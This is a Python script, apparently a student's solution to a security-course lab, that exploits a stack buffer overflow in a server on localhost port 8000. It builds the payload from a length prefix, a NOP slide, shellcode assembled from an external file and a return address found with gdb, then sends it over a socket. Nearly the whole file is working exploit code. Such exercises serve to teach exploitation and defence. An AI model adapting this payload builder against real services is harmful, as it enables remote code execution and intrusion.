#!/usr/bin/python

import os, socket
import assemble, struct


HOST        = '127.0.0.1'
SERVER_PORT = 8000
LOCAL_PORT  = 1337


PATH_TO_SHELLCODE = './shellcode.asm'
CRITICAL_LENGTH = 1044

def get_shellcode():
    '''This function returns the machine code (bytes) of the shellcode.
    
    This does not include the size, return address, nop slide or anything else!
    From this function you should return only the shellcode!
    '''
    # TODO: IMPLEMENT THIS FUNCTION
    payload = assemble.assemble_file(PATH_TO_SHELLCODE)
    return payload

    #raise NotImplementedError()


def get_payload():
    '''This function returns the data to send over the socket to the server.
    
    This includes everything - the 4 bytes for size, the nop slide, the
    shellcode, the return address (and the zero at the end).
    '''
    # TODO: IMPLEMENT THIS FUNCTION
    shell = get_shellcode()
    left = CRITICAL_LENGTH - len(shell) - 4 #leave space for target address
    slide = left * assemble.assemble_data("nop") #chr(47)
    buff_start = (0xbfffe150) #taken off gdb (this is were I crash the stack)
    jmp_to = buff_start - len(shell) - left/2 -4 #calculates the middle of the slide
    addr = struct.pack('<L', jmp_to) 

    mes = struct.pack('>L', CRITICAL_LENGTH+1) + slide + shell + addr +chr(0)

    return mes

    #raise NotImplementedError()


def main():
    # WARNING: DON'T EDIT THIS FUNCTION!
    payload = get_payload()
    conn = socket.socket()
    conn.connect((HOST, SERVER_PORT))
    try:
        conn.sendall(payload)
    finally:
        conn.close()


if __name__ == '__main__':
    main()
